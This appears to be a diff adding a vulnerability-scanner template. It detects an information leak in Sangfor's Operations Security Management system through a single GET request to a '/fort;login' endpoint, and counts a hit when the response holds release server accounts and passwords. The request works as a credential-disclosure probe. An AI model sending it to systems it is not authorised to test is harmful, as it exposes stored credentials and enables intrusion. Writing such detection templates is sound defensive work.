@@ -1,0 +1,33 @@
+id: sangfor-osm-get-all-application-release-info-leak
+info:
+  name: Sangfor OSM get_all_application_release Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak
+  description: |
+    Sangfor Operations Security Management system contains an information disclosure vulnerability in the endpoint `/fort;login/app/get_all_application_release`.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/fort;login/app/get_all_application_release"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"fortApplicationAeleaseServers":'
+          - '"fortApplicationReleaseServerAccount":'
+          - '"fortApplicationReleaseServerPassword":'
+          - '"success":"success"'
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]*$" # Ensures response body does not contain '<'
+      - type: word
+        part: header
+        words:
+          - "application/json"
